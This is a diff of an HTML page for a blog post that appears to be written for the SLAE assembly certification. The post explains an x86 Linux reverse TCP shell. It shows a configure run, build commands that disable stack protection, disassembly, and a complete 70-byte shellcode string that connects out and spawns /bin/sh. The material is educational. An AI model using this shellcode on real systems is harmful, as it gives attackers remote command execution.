@@ -9,7 +9,7 @@
   <meta name="author" content="tcunha">
 
   
-  <meta name="description" content="Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to &hellip;">
+  <meta name="description" content="This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -84,7 +84,14 @@
   </header>
 
 
-<div class="entry-content"><p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
+<div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>Like the previous bind shell, this one is using the well known socket functions. Given that it is supposed to connect to a remote system, it needs to call the <a href="http://man7.org/linux/man-pages/man2/accept.2.html">connect(2)</a> function instead of accepting. There&rsquo;s also no need of binding, since the kernel will automatically choose an ephemeral port and determine the source IP address.</p>
 
 <figure class='code'><figcaption><span>connect(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 </pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">connect</span><span class="p">(</span><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">socklen_t</span> <span class="n">addrlen</span><span class="p">);</span>
@@ -519,6 +526,7 @@
 <span class='line-number'>52</span>
 <span class='line-number'>53</span>
 <span class='line-number'>54</span>
+<span class='line-number'>55</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -h 127.2.2.2 -r 1337
 </span><span class='line'>Using remote host: 0x0202027f
 </span><span class='line'>Using listening port: 0x9210
@@ -534,7 +542,7 @@
 </span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x02-reverse/
 </span><span class='line'><span class="nv">$ </span>make
 </span><span class='line'>nasm  -f elf32 -o reverse.o reverse.asm
-</span><span class='line'>ld  -o reverse reverse.o
+</span><span class='line'>ld -N -zexecstack -o reverse reverse.o
 </span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
 </span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
 </span><span class='line'> 8048062:       <span class="m">99</span>                      cdq
@@ -573,6 +581,7 @@
 </span><span class='line'> 80480a4:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
 </span><span class='line'>Shellcode size: 70
 </span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>59<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>99<span class="se">\x</span>50<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -621,13 +630,6 @@
 </span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>          <span class="o">=</span> 0
 </span></code></pre></td></tr></table></div></figure>
 
-
-<p>This blog post has been created for completing the requirements of the
-SecurityTube Linux Assembly Expert certification:</p>
-
-<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
-
-<p>Student-ID: SLAE-1154</p>
 </div>
 
 
@@ -669,6 +671,8 @@ SecurityTube Linux Assembly Expert certification:</p>
         <a class="basic-alignment left" href="/blog/2018/05/20/slae-0x01-bind-tcp-shell/" title="Previous Post: SLAE 0x01: Bind TCP shell">&laquo; SLAE 0x01: Bind TCP shell</a>
       
       
+        <a class="basic-alignment right" href="/blog/2018/06/19/slae-0x03-egghunter/" title="Next Post: SLAE 0x03: Egghunter">SLAE 0x03: Egghunter &raquo;</a>
+      
     </p>
   </footer>
 </article>
@@ -680,6 +684,10 @@ SecurityTube Linux Assembly Expert certification:</p>
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
@@ -695,10 +703,6 @@ SecurityTube Linux Assembly Expert certification:</p>
     
       <li class="post">
         <a href="/blog/2017/11/01/vulnerable-docker-vm-easy/">Vulnerable Docker VM: Easy</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/12/29/protostar-stack/">Protostar Stack</a>
       </li>
     
   </ul>
